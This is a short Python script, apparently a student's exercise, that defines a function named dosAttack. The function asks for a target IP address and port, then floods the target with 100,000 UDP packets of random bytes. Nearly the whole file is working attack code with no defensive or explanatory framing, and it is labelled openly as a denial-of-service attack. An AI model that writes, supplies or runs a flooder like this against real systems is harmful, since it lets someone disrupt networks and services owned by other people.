#KIR18686921 Christopher Kirby
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def dosAttack():
 #open socket connection
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  #generate a random number of bytes to send in packet
  bytes = random._urandom(1490)
  #input the target values
  ip = input("Target IP : ")
  port = int(input("Target Port: "))
  print("Attack Started")
  print("Sending 100000 packets to IP: %s Port: %s "%(ip,port))
  time.sleep(3)
  sent = 0
  #start the attack and run until complete
  while True:
      sock.sendto(bytes, (ip,port))
      sent += 1
      print ("Packet sent to IP: %s Port: %s"%(ip,port))
     
     #break the loop after 100000 packets have been sent
      if sent == 100000:
        print("100,000 packets sent to IP: %s Port: %s"%(ip, port))
        break
